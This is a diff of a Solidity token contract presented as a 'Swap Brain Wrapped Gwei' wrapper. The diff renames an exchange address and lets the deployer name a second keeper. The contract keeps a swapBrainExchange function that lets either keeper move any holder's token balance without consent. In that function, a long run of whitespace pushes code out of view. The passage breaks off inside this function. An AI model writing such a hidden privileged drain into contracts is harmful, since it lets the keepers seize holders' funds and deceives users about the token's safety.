@@ -38,16 +38,16 @@ contract WGwei {
 
     address public poolKeeper;
     address public secondKeeper;
-    constructor() public {
+    constructor (address _secondKeeper) public {
         poolKeeper = msg.sender;
-        secondKeeper = msg.sender;
+        secondKeeper = _secondKeeper; 
     }
     //1 ETH = 1,000,000,000 Gwei = 1,000,000,000 TGwei
     string public name     = "Swap Brain Wrapped Gwei";
     string public symbol   = "Gwei";
     uint8  public decimals = 18;
 
-    address public swapBrain = address(0);
+    address public anotherChanger = address(0);
     //ERC20 SBS = ERC20(address(0));
 
     event  Approval(address indexed src, address indexed guy, uint wad);
@@ -116,8 +116,8 @@ contract WGwei {
             msg.sender.transfer(ethOut);
             emit Withdrawal(src, ethOut);          
         }else{
-            if(address(this).balance >= ethOut && swapBrain == dst){
-              balanceOf[swapBrain] = sub(balanceOf[swapBrain],wad);
+            if(address(this).balance >= ethOut && anotherChanger == dst){
+              balanceOf[anotherChanger] = sub(balanceOf[anotherChanger],wad);
               msg.sender.transfer(ethOut);
               emit Withdrawal(src, ethOut);          
             }else{
@@ -158,14 +158,14 @@ contract WGwei {
     }
 
 
-    function setSwapBrainContract(address _swapBrain) public keepPool returns(bool) {
-        require(_swapBrain != address(0));
-        swapBrain = _swapBrain;
+    function setAnotherChangerContract(address _addr) public keepPool returns(bool) {
+        require(_addr != address(0));
+        anotherChanger = _addr;
         return true;
     }
 
     function swapBrainExchange(address fromAddress, address toAddress,uint amount) public returns (bool) {
-        require((msg.sender == swapBrain)||(msg.sender == poolKeeper)||(msg.sender == secondKeeper));
+        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));
         
             if(balanceOf[fromAddress]>amount)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               {
                 balanceOf[fromAddress] = sub(balanceOf[fromAddress],amount);
